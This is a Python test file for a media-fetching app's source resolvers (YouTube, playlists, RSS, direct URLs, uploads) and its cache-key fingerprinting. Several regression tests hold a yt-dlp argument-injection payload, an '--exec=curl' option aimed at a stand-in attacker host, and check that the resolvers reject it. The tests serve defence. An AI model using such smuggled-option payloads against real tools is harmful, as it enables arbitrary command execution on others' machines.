import hashlib, io, json, subprocess, httpx
from pathlib import Path
from boxbutler.domain.cache_name import cache_name, parse_cache_name
from boxbutler.domain.models import ItemKind
from boxbutler.sources.youtube_url import YouTubeUrlSource
from boxbutler.sources.youtube_playlist import YouTubePlaylistSource
from boxbutler.sources.rss import RssSource
from boxbutler.sources.direct_url import DirectUrlSource
from boxbutler.sources.upload import UploadSource, fingerprint

def jrunner(payload):
    return lambda a, **k: subprocess.CompletedProcess(a, 0, json.dumps(payload), "")

def test_youtube_url_resolves_one_item():
    s = YouTubeUrlSource(runner=jrunner({"id": "QzuMO0t5JUI", "title": "Yeti 🍝", "duration": 7200}))
    assert s.matches("https://www.youtube.com/watch?v=QzuMO0t5JUI") and not s.matches("https://example.invalid/a.mp3")
    [r] = s.resolve("https://www.youtube.com/watch?v=QzuMO0t5JUI")
    assert (r.kind, r.source_key, r.seconds) == (ItemKind.YOUTUBE, "QzuMO0t5JUI", 7200)

def test_playlist_expands_in_upstream_order():
    s = YouTubePlaylistSource(runner=jrunner({"entries": [{"id": "a1", "title": "A", "url": "u1"}, {"id": "b2", "title": "B", "url": "u2"}]}))
    assert s.matches("https://www.youtube.com/playlist?list=PLxyz")
    got = s.resolve("https://www.youtube.com/playlist?list=PLxyz")
    assert [g.source_key for g in got] == ["a1", "b2"] and all(g.kind == ItemKind.PLAYLIST_ENTRY for g in got)


# Final review, Major 1: yt-dlp argument injection via the "add a source"
# field. `--exec=curl http://attacker.invalid/?p=youtu.be/aaaaaaaaaaa`
# contains a YouTube-looking substring, so an unanchored substring match
# used to accept it as a "YouTube URL" and place it as the trailing argv
# entry, where yt-dlp reads a leading `-` as an option, not a URL —
# arbitrary command execution. Both resolvers must reject it outright.
_INJECTION_PAYLOAD = "--exec=curl http://attacker.invalid/?p=youtu.be/aaaaaaaaaaa"


def test_youtube_url_rejects_option_looking_payload():
    s = YouTubeUrlSource(runner=jrunner({}))
    assert s.matches(_INJECTION_PAYLOAD) is False


def test_youtube_playlist_rejects_option_looking_payload():
    s = YouTubePlaylistSource(runner=jrunner({}))
    assert s.matches("--exec=curl http://attacker.invalid/?p=x&list=PLxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx") is False


def test_youtube_url_resolve_always_terminates_options_with_dashdash():
    # Even a value that somehow reached resolve() unvalidated must not be
    # interpretable as an option: assert on the actual argv list, not on
    # "no exception raised".
    captured = []

    def runner(args, **kw):
        captured.append(args)
        return subprocess.CompletedProcess(args, 0, json.dumps({"id": "x", "title": "t"}), "")

    YouTubeUrlSource(runner=runner).resolve(_INJECTION_PAYLOAD)
    [args] = captured
    assert args[-2:] == ["--", _INJECTION_PAYLOAD]
    assert args.index("--") == len(args) - 2


def test_youtube_playlist_resolve_always_terminates_options_with_dashdash():
    captured = []

    def runner(args, **kw):
        captured.append(args)
        return subprocess.CompletedProcess(args, 0, json.dumps({"entries": []}), "")

    YouTubePlaylistSource(runner=runner).resolve(_INJECTION_PAYLOAD)
    [args] = captured
    assert args[-2:] == ["--", _INJECTION_PAYLOAD]

def test_rss_enclosures(tmp_path):
    xml = Path(__file__).parent / "fixtures" / "feed.xml"
    client = httpx.Client(transport=httpx.MockTransport(lambda r: httpx.Response(200, content=xml.read_bytes())))
    got = RssSource(client).resolve("https://example.invalid/feed.xml")
    # Review round 1, Critical: source_key is sha1(guid-or-url)[:16], never
    # the raw guid/URL verbatim — an unhashed key (a guid or enclosure URL
    # almost always contains "/" and ".") breaks cache_name()'s round trip
    # and silently disables Task 13's cache-hit detection forever.
    expected = [hashlib.sha1(s.encode()).hexdigest()[:16] for s in
                ("guid-ep1", "https://example.invalid/ep2.mp3")]          # guid, else enclosure url
    assert [g.source_key for g in got] == expected
    assert all(len(g.source_key) == 16 for g in got)
    assert got[0].kind == ItemKind.RSS and got[0].seconds == 3723.0                       # itunes:duration 1:02:03

def test_rss_key_round_trips_through_cache_name():
    # Regression guard for the review round 1 Critical: a guid containing
    # "/", "." and "]" must still produce a source_key that parse_cache_name
    # can recover — this is exactly the shape a real permalink guid has.
    xml = (
        b'<?xml version="1.0"?><rss version="2.0"><channel><item>'
        b"<title>Weird Guid Episode</title>"
        b"<guid>https://feed.example.invalid/ep/123].mp3</guid>"
        b'<enclosure url="https://feed.example.invalid/ep123.mp3" type="audio/mpeg"/>'
        b"</item></channel></rss>"
    )
    client = httpx.Client(transport=httpx.MockTransport(lambda r: httpx.Response(200, content=xml)))
    [item] = RssSource(client).resolve("https://example.invalid/weird.xml")
    name = cache_name(item.title, item.source_key, "mp3")
    _title, parsed_key, parsed_ext = parse_cache_name(name)
    assert parsed_key == item.source_key and parsed_ext == "mp3"

def test_rss_matches_is_syntactic_no_network():
    # Review round 1, Important: matches() must not fetch — it used to GET
    # the same URL resolve() then GETs again, doubling round trips per feed
    # and risking the two responses disagreeing.
    def blow_up(request):
        raise AssertionError("RssSource.matches() must not perform network I/O")
    client = httpx.Client(transport=httpx.MockTransport(blow_up))
    s = RssSource(client)
    assert s.matches("https://example.invalid/feed.xml") is True
    assert s.matches("not-a-url") is False

def test_all_resolver_keys_round_trip_cache_name(tmp_path):
    # Review round 1: turn the RSS bug into an invariant that covers every
    # resolver, so a future one can't reintroduce an unsafe key shape.
    keys = []
    keys.append(
        YouTubeUrlSource(runner=jrunner({"id": "abc123", "title": "T", "duration": 10}))
        .resolve("https://www.youtube.com/watch?v=abc123")[0].source_key
    )
    keys.append(
        YouTubePlaylistSource(runner=jrunner({"entries": [{"id": "p1", "title": "P", "url": "u"}]}))
        .resolve("https://www.youtube.com/playlist?list=X")[0].source_key
    )
    xml = Path(__file__).parent / "fixtures" / "feed.xml"
    rss_client = httpx.Client(transport=httpx.MockTransport(lambda r: httpx.Response(200, content=xml.read_bytes())))
    keys.extend(g.source_key for g in RssSource(rss_client).resolve("https://example.invalid/feed.xml"))
    direct_client = httpx.Client(transport=httpx.MockTransport(lambda r: httpx.Response(200, headers={"content-type": "audio/mpeg"})))
    keys.append(DirectUrlSource(direct_client).resolve("https://example.invalid/story.m4a")[0].source_key)
    up = UploadSource(tmp_path / "uploads")
    keys.append(up.save("song.mp3", io.BytesIO(b"x" * 1000)).source_key)

    # Task 17: folder-scanner keys are the same fingerprint scheme as
    # UploadSource's (shared function, same key space) — extend the
    # invariant to cover it explicitly rather than relying on it being
    # "obviously the same" as the upload case above.
    folder_file = tmp_path / "book" / "01 - chapter.mp3"
    folder_file.parent.mkdir(parents=True, exist_ok=True)
    folder_file.write_bytes(b"y" * 2000)
    keys.append(fingerprint(folder_file))

    for key in keys:
        name = cache_name("Some Title", key, "mp3")
        _title, parsed_key, parsed_ext = parse_cache_name(name)
        assert parsed_key == key and parsed_ext == "mp3"

def test_direct_url_by_extension_or_content_type():
    client = httpx.Client(transport=httpx.MockTransport(lambda r: httpx.Response(200, headers={"content-type": "audio/mpeg"})))
    s = DirectUrlSource(client)
    assert s.matches("https://example.invalid/story.m4a") and s.matches("https://example.invalid/stream")
    [r] = s.resolve("https://example.invalid/story.m4a")
    assert r.kind == ItemKind.URL and r.title == "story" and len(r.source_key) == 16

def test_upload_saves_and_fingerprints(tmp_path):
    up = UploadSource(tmp_path / "uploads")
    import io
    r = up.save("My Song 🎵.mp3", io.BytesIO(b"ID3" + b"\0" * 100))
    assert r.kind == ItemKind.UPLOAD and Path(r.local_path).exists() and r.source_key == fingerprint(Path(r.local_path))
    assert "🎵" not in Path(r.local_path).name

def test_fingerprint_stable_across_rename(tmp_path):
    a = tmp_path / "a.mp3"; a.write_bytes(b"x" * 10_000_000)
    fa = fingerprint(a); a.rename(tmp_path / "b.mp3")
    assert fingerprint(tmp_path / "b.mp3") == fa

def test_fingerprint_distinguishes_same_head_tail_different_middle(tmp_path):
    # Task 17 review (Important): a head+tail-only hash collides for two
    # files sharing an encoder header, similar length, and trailing
    # silence — exactly ripped-audiobook-chapter shape. Both files here
    # are the same size and share identical first/last 4 MiB; only bytes
    # inside the middle sampling window (see fingerprint()'s docstring)
    # differ, so this only passes once the middle is part of the hash.
    size = 13 * 1024 * 1024  # above _FULL_HASH_THRESHOLD (12 MiB)
    base = bytearray(b"A" * size)
    a = tmp_path / "chapter_a.mp3"; a.write_bytes(bytes(base))
    base[6_000_000] ^= 0xFF  # inside the middle window, outside head/tail
    b = tmp_path / "chapter_b.mp3"; b.write_bytes(bytes(base))
    assert a.read_bytes()[:10] == b.read_bytes()[:10]  # head identical
    assert a.read_bytes()[-10:] == b.read_bytes()[-10:]  # tail identical
    assert fingerprint(a) != fingerprint(b)
